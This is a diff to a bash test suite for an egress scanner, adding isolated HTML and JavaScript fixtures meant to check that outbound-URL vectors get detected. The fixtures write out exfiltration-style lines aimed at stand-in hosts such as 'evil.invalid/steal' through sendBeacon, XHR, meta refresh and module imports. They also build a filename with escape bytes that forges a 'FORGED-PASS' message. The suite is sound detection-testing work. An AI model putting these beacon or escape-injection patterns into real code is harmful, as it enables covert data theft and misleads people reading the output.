@@ -52,11 +52,13 @@ ln -s /etc/hosts "$T/symonly/only-link"
 printf 'x %s\n' "$(url_https nl.example.invalid/x)"                       > "$T/nlname/we"$'\n'"ird.txt"
 
 # --- 2.0.3 self-red-team fixtures (adversarial panel) ---
-mkdir -p "$T/pr" "$T/laundry" "$T/webrtc" "$T/localok" "$T/fifo" "$T/binurl"
-# protocol-relative //host in browser-auto-fetched contexts (bare '//', assembled to stay inert here)
+mkdir -p "$T/pr_srcset" "$T/pr_poster" "$T/pr_meta" "$T/laundry" "$T/webrtc" "$T/localok" "$T/fifo" "$T/binurl"
+# protocol-relative //host in browser-auto-fetched contexts (bare '//', assembled to stay inert here).
+# R6 finding #4: each vector gets its OWN isolated dir so one hit can never mask another.
 _j="${_sep}${_sl}${_sl}"
-printf '<img srcset="%scdn.evil.invalid/a.png 2x">\n<video poster="%sevil.invalid/f.jpg"></video>\n' "${_sl}${_sl}" "${_sl}${_sl}" > "$T/pr/index.html"
-printf '<meta http-equiv="refresh" content="0;url=%sevil.invalid/next">\n' "${_sl}${_sl}" > "$T/pr/redirect.html"
+printf '<img srcset="%scdn.evil.invalid/a.png 2x">\n' "${_sl}${_sl}"                 > "$T/pr_srcset/i.html"
+printf '<video poster="%sposter.evil.invalid/f.jpg"></video>\n' "${_sl}${_sl}"       > "$T/pr_poster/i.html"
+printf '<meta http-equiv="refresh" content="0;url=%smeta.evil.invalid/next">\n' "${_sl}${_sl}" > "$T/pr_meta/i.html"
 # DOCTYPE-wrapped REAL url must NOT be laundered (the old <!DOCTYPE ...> strip ate it) -> must FAIL
 printf 'var a="<!doctype"; var u="%s"; var b=">";\n' "$(url_https evil.invalid/steal)" > "$T/laundry/app.js"
 # WebRTC stun: scheme (inert literal — no http prefix for the manifest classifier)
@@ -86,6 +88,9 @@ printf '<object data="%sevil.invalid/x.swf"></object>\n' "$_pr"       > "$T/objd
 printf 'navigator.sendBeacon("%sevil.invalid/b");\n' "$_pr"           > "$T/beacon/a.js"
 printf 'var x=new XMLHttpRequest(); x.open("GET","%sevil.invalid/d");\n' "$_pr" > "$T/xhropen/a.js"
 printf '<img srcset="%sa.invalid/1.png 1x, %sb.invalid/2.png 2x">\n' "$_pr" "$_pr" > "$T/srcset2/i.html"
+mkdir -p "$T/srcset_a" "$T/srcset_b"                          # R6 #4: each candidate ALSO isolated alone
+printf '<img srcset="%ssa.invalid/1.png 1x">\n' "$_pr"                > "$T/srcset_a/i.html"
+printf '<img srcset="%ssb.invalid/2.png 2x">\n' "$_pr"                > "$T/srcset_b/i.html"
 printf '<a href=" %sevil.invalid/lead">x</a>\n' "$_pr"               > "$T/leadws/i.html"
 printf '<img\n  src\n  ="%sevil.invalid/ml">\n' "$_pr"               > "$T/mlattr/i.html"   # multiline attr
 printf 'fetch(\n  "%sevil.invalid/mlf")\n' "$_pr"                    > "$T/mlfetch/a.js"    # multiline literal
@@ -124,12 +129,36 @@ mkdir -p "$T/ns2"
 printf '<svg xmlns="%s" xmlns:xlink="%s"></svg>\n' \
   "$(url_http www.w3.org/2000/svg)" "$(url_http www.w3.org/1999/xlink)" > "$T/ns2/i.svg"
 
+# --- 2.0.3-r6 fixtures (Codex round-5 exact-head), each class ISOLATED ---
+# finding S2: valid COMPACT ES modules (no whitespace after the keyword) must be caught
+mkdir -p "$T/r6imp" "$T/r6exp" "$T/r6star" "$T/r6bare" "$T/r6konst"
+printf 'import{a}from"%sevil.invalid/m"\n' "$_pr"                     > "$T/r6imp/a.js"     # import{a}from
+printf 'export{a}from"%sevil.invalid/m"\n' "$_pr"                     > "$T/r6exp/a.js"     # export{a}from
+printf 'import*as n from"%sevil.invalid/m"\n' "$_pr"                  > "$T/r6star/a.js"    # import*as
+printf 'import"%sevil.invalid/side"\n' "$_pr"                         > "$T/r6bare/a.js"    # bare import"//h"
+printf 'export const x = "%sdocs";\n' "$_pr"                          > "$T/r6konst/a.js"   # string const, NOT a fetch
+# finding S3: a filename carrying an ESC + forged text must be sanitized in every diagnostic
+mkdir -p "$T/r6esc"
+ln -s /etc/hosts "$T/r6esc/$(printf 'evil\033[32mFORGED-PASS\033[0m')" 2>/dev/null || true
+
 check() { # <label> <want-exit> <needle-or-empty> -- <scan args...>
   local label="$1" want="$2" needle="$3"; shift 3
   local out got
   out="$(bash "$SCAN" "$@" 2>&1)"; got=$?
   if [ "$got" != "$want" ]; then no "$label (exit want=$want got=$got)"; return; fi
   if [ -n "$needle" ] && ! printf '%s' "$out" | grep -q -- "$needle"; then no "$label (missing '$needle')"; return; fi
+  ok "$label"
+}
+
+check_count() { # <label> <want-exit> <want-EGRESS-line-count> -- <scan args...>
+  # asserts the EXACT number of EGRESS records, so on a multi-candidate line one detected hit can
+  # never mask a missed sibling (R6 finding #4).
+  local label="$1" want="$2" wantc="$3"; shift 3
+  local out got cnt
+  out="$(bash "$SCAN" "$@" 2>&1)"; got=$?
+  cnt="$(printf '%s\n' "$out" | grep -c '^EGRESS ')"
+  if [ "$got" != "$want" ]; then no "$label (exit want=$want got=$got)"; return; fi
+  if [ "$cnt" != "$wantc" ]; then no "$label (EGRESS count want=$wantc got=$cnt)"; return; fi
   ok "$label"
 }
 
@@ -149,8 +178,9 @@ check "binary waived by --allow-binary passes"  0 "WAIVED-BINARY"     --allow-bi
 check "unmatched --allow-binary still fails"    1 "UNSCANNED(binary)" --allow-binary '*.png' "$T/binonly"
 
 echo "== 2.0.3 self-red-team (adversarial panel) =="
-check "protocol-relative srcset/poster fails"   1 "EGRESS"            "$T/pr"
-check "meta-refresh protocol-relative fails"     1 "EGRESS"            "$T/pr"
+check "protocol-relative srcset fails (isolated)" 1 "cdn.evil.invalid"  "$T/pr_srcset"
+check "protocol-relative poster fails (isolated)" 1 "poster.evil.invalid" "$T/pr_poster"
+check "meta-refresh protocol-relative fails"     1 "meta.evil.invalid" "$T/pr_meta"
 check "DOCTYPE wrapper does not launder a URL"   1 "EGRESS"            "$T/laundry"
 check "WebRTC stun: scheme detected"             1 "EGRESS"            "$T/webrtc"
 check "same-origin/data fetch + README pass"     0 ""                 "$T/localok"
@@ -166,7 +196,9 @@ check "NUL-free P6 rawbits classified binary"    1 "UNSCANNED(binary)" "$T/ppm"
 check "object data protocol-relative fails"      1 "EGRESS"            "$T/objdata"
 check "navigator.sendBeacon fails"               1 "EGRESS"            "$T/beacon"
 check "XHR.open URL argument fails"              1 "EGRESS"            "$T/xhropen"
-check "every srcset candidate fails"             1 "EGRESS"            "$T/srcset2"
+check_count "both srcset candidates flagged (count==2)" 1 2            "$T/srcset2"
+check "srcset candidate A isolated fails"        1 "sa.invalid/1.png"  "$T/srcset_a"
+check "srcset candidate B isolated fails"        1 "sb.invalid/2.png"  "$T/srcset_b"
 check "leading whitespace in quoted attr fails"  1 "EGRESS"            "$T/leadws"
 check "multiline attribute fails"                1 "EGRESS"            "$T/mlattr"
 check "multiline fetch literal fails"            1 "EGRESS"            "$T/mlfetch"
@@ -196,6 +228,57 @@ if [ "$(id -u)" -ne 0 ]; then
 else
   printf '  skip  unreadable-file + traversal (running as root — cannot simulate unreadable)\n'
 fi
+
+echo "== 2.0.3-r6 (Codex round-5 exact-head) =="
+# S2: compact ES module forms are caught; a string constant with no `from` stays clean
+check "compact import{a}from is caught"          1 "EGRESS"       "$T/r6imp"
+check "compact export{a}from is caught"          1 "EGRESS"       "$T/r6exp"
+check "compact import*as ... from is caught"     1 "EGRESS"       "$T/r6star"
+check "bare side-effect import is caught"        1 "EGRESS"       "$T/r6bare"
+check "export const string is NOT egress"        0 ""             "$T/r6konst"
+# S3: an ESC-bearing filename must appear neutralized (no raw ESC byte) in the diagnostic
+r6esc_out="$(bash "$SCAN" "$T/r6esc" 2>&1)"
+if printf '%s' "$r6esc_out" | LC_ALL=C grep -q "$(printf '\033')"; then
+  no "S3 control byte in path is sanitized (raw ESC leaked)"
+else
+  ok "S3 control byte in path is sanitized (raw ESC leaked)"
+fi
+# S3 also: the sanitized diagnostic still visibly reports the symlink with '?' placeholders
+if printf '%s' "$r6esc_out" | grep -q 'SYMLINK .*FORGED-PASS'; then
+  ok "S3 sanitized SYMLINK still shown"
+else
+  no "S3 sanitized SYMLINK still shown"
+fi
+
+# S1: unit-test the REAL trusted-counts validator lifted from the shipped scanner. A honest canonical
+# record is accepted; every producer/runtime fault (leading-zero/octal, overflow, extra line, no
+# trailing newline, trailing garbage, NUL, wrong arity, non-ASCII) is REJECTED so the gate fails closed.
+CFNS="$(mktemp)"
+awk '
+  $0 ~ /^is_canon_count\(\) \{/ {p=1}
+  $0 ~ /^validate_counts_file\(\) \{/ {p=1}
+  p {print}
+  p && $0=="}" {p=0}
+' "$SCAN" > "$CFNS"
+# shellcheck source=/dev/null
+. "$CFNS"
+CT="$(mktemp -d)"
+counts_accepts() { printf '%b' "$2" > "$CT/c"; if validate_counts_file "$CT/c" >/dev/null; then ok "$1"; else no "$1 (rejected a canonical record)"; fi; }
+counts_rejects() { printf '%b' "$2" > "$CT/c"; if validate_counts_file "$CT/c" >/dev/null; then no "$1 (accepted a fault -> would fail OPEN)"; else ok "$1"; fi; }
+counts_accepts "S1 counts accept 0 0 0"          '0 0 0\n'
+counts_accepts "S1 counts accept 3 1 2"          '3 1 2\n'
+counts_accepts "S1 counts accept 9-digit max"    '999999999 0 0\n'
+counts_rejects "S1 counts reject leading-zero 08" '08 0 0\n'
+counts_rejects "S1 counts reject overflow"       '99999999999999999999 0 0\n'
+counts_rejects "S1 counts reject 10-digit field" '1000000000 0 0\n'
+counts_rejects "S1 counts reject extra line"     '0 0 0\n99 0 0\n'
+counts_rejects "S1 counts reject no newline"     '0 0 0'
+counts_rejects "S1 counts reject trailing junk"  '0 0 0\nx'
+counts_rejects "S1 counts reject embedded NUL"   '0 0 0\000\n'
+counts_rejects "S1 counts reject 2 fields"       '0 0\n'
+counts_rejects "S1 counts reject 4 fields"       '0 0 0 0\n'
+counts_rejects "S1 counts reject non-ASCII"      '0 0 \303\251\n'
+rm -rf "$CT" "$CFNS"
 
 echo
 echo "RESULT pass=$pass fail=$fail"
